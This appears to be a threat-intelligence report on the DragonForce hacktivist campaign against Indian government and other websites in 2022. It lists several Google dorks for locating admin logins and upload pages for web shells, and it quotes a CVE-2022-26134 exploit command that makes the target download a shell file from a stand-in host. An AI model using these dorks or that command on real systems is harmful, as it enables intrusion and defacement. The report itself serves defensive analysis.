Analysis & Attribution
Information from Social Media
On 10 June 2022, CloudSEK’s contextual AI digital risk platform XVigil discovered a
Tweet posted by the Malaysian hacktivist group, DragonForce, calling for attacks on
Indian Government websites by Muslim hackers all around the world.
The group’s primary objective of the attack was to get back at the Indian Government
for controversial comments on Prophet Muhammad by some Indian politicians.
Since then, the group and its supporters have compromised more than 3,000
government and non-government organizations, military websites, and private entities.
The compromised entities include BJP (the ruling party of India), Army veteran
websites, academic institutes, etc.
About their Servers
The group uses two DNS servers, “annabel.ns.cloudflare.com” and
“nicolas.ns.cloudflare.com” with 104.21.35.227, and 172.67.180.87 being the IP
addresses of the servers respectively.
It was discovered that the DragonForce domain was hosted along with multiple
Russian, Australian, Chinese, and other websites alongside multiple adult domains.

Techniques, Tactics, & Procedures (TTPs)
The three primary attack vectors used by the group and its supporters are as follows and as
expressed in the flow diagram:
Google Dorking
Shodan Dorks
DDoS Attacks

Google Dorks
Google Dorks are the primary source of the group's targets, which is confirmed from
the following image of a Tiktok video made by one of DragonForce's allies:

The Google Dorks list included dorks for finding various educational institutions,
wherein dorks relating to academic and campus logins were found.
The full list contains around 360 google dorks which could have been abused for
numerous malicious purposes. A few significant dorks from the list are mentioned:
Google Dorks
inurl:/admin/upload/ : Ministry of
Knowledge & Resource sharing

inurl: /login/login.php admin: For Admin
logins into websites using PHP
language

“allowed file types: png gif jpg txt
site:gov.in” : Google dork to upload shell
html files into the server

php?id= site:in: Indian sites with ID
parameter that can be abused and URL
manipulation could be performed

inurl/mnux = campus login : Academic
institutions with Campus login parameter

inurl/mnux = academic login : Academic
institutions with Academic login
parameter

inurl/mnux = administrative academic
login : Academic institutions with
Administrative academic login parameter

inurl: /admin/cp.php : Reveals all sites
with Control panel which can provide
access to the server.

inurl:admin/upload.php : For sites with
upload feature that actors could exploit
for shell using script deface
Shodan Dorks and Atlassian Confluence Vulnerability
A PoC was shared for the exploit of the Atlassian Confluence vulnerability along with
the Shodan dork for Confluence Server vulnerabilities targeted towards the Indian
region.

The actor also shared a GitHub repository script which can be downloaded and
exploited using the following python command:
CVE-2022-26134.py http://targets.com “wget https://site.com/shell.txt -O DFM.php
DDoS Attacks (HTTP Flooding)
The group invited its members and other users on the forum to conduct the DDoS
attack where they shared an infographic stating the website, IP addresses, and the port
of the target.

4/9

Infographic shared by DragonForce group for OpsIndia/OpsPatuk
The group used a tool called HTTPFLOOD (aka “./404FOUND.MY”), which
manipulates and posts unwanted requests to bring down a web server or application.
The tool has been built in Python language and it takes the following three inputs:
A target URL
A Proxy list
Number of threads (i.e count of requests to be sent to the server)
Further analysis found that the user 'SKYSG404' built the HTTPFLOOD tool, and that
both the tool and the Github account hosting it were created on 12 June 2022.

Compromising Servers
It was observed that a large number of domains being targeted, resolved to a common
IP where they were hosted.
The attackers appeared to have gained access to the server via an injection
vulnerability on one of the websites.
Once a server is compromised, all the websites hosted on it easily fall prey to the
attackers, as seen in the pie chart below.

Pie chart depicting common IP being shared by multiple Domain names
As witnessed in the table given below, almost 61% of the domains compromised
belonged to E2ENetworks.in which is based in Delhi, India.
Another major chunk, 20.8%, of hacked domains belonged to Atria Convergence
Technologies Pvt. Ltd.

Jointly, both of these ISPs constitute around 81% of the compromised websites.

Impact & Mitigation
Impact
Escalation of such campaigns on a
global level can lead to atrocious
consequences for the Indian
government and entities.
Exposed data would equip
malicious actors with details
required to launch sophisticated
attacks.
Attacks on defense infrastructure
can lead to sensitive information
being compromised and cause a
national security issue.

Mitigation
Patch vulnerable and exploitable
endpoints.
Monitor for anomalies in user
accounts and internet-exposed
web applications, indicating
possible account takeovers.
Scan repositories to identify
exposed credentials and secrets.
Monitor cybercrime forums for the
latest tactics employed by threat
actors.
